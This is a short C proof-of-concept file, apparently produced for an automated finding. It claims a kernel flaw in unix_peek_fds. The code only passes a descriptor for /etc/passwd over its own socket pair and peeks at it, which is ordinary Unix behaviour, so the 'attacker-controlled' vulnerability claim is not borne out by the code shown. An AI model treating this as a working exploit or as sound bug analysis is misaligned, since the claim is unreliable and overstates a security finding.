/*
 * PoC for STASE finding: WMI-3 Attacker-Determined Content in an Authoritative Position
 * Vulnerable function: unix_peek_fds (net/unix/af_unix.c:1777)
 *
 * This PoC triggers unix_peek_fds via:
 *   1. Create AF_UNIX SOCK_DGRAM socket pair
 *   2. sendmsg with SCM_RIGHTS (file descriptor) 
 *   3. recvmsg with MSG_PEEK flag
 *
 * unix_peek_fds calls scm_fp_dup() which copies attacker-controlled file
 * descriptors from the skb into scm_cookie.fp (the authoritative position)
 * without trust validation.
 */

#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <fcntl.h>
#include <stddef.h>

int main(void)
{
    int sv[2];
    int fd;
    char data[8];
    char ctl[CMSG_SPACE(sizeof(int))];
    struct msghdr msg = {0};
    struct iovec iov = {data, sizeof(data)};
    struct cmsghdr *cmsg;

    /* Step 1: Create AF_UNIX socket pair */
    socketpair(AF_UNIX, SOCK_DGRAM, 0, sv);

    /* Step 2: Open a file (attacker-determined content) */
    fd = open("/etc/passwd", O_RDONLY);

    /* Step 3: Send SCM_RIGHTS ancillary data */
    cmsg = (struct cmsghdr *)ctl;
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    *(int *)CMSG_DATA(cmsg) = fd;

    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = ctl;
    msg.msg_controllen = sizeof(ctl);
    sendmsg(sv[0], &msg, 0);

    /* Step 4: recvmsg with MSG_PEEK -> triggers unix_peek_fds
     *         -> scm->fp = scm_fp_dup(UNIXCB(skb).fp)
     *         Copies attacker's fd list into authoritative position */
    msg.msg_control = ctl;
    msg.msg_controllen = sizeof(ctl);
    recvmsg(sv[1], &msg, MSG_PEEK);

    /* Step 5: Consume the message */
    recvmsg(sv[1], &msg, 0);

    close(fd);
    close(sv[0]);
    close(sv[1]);
    return 0;
}
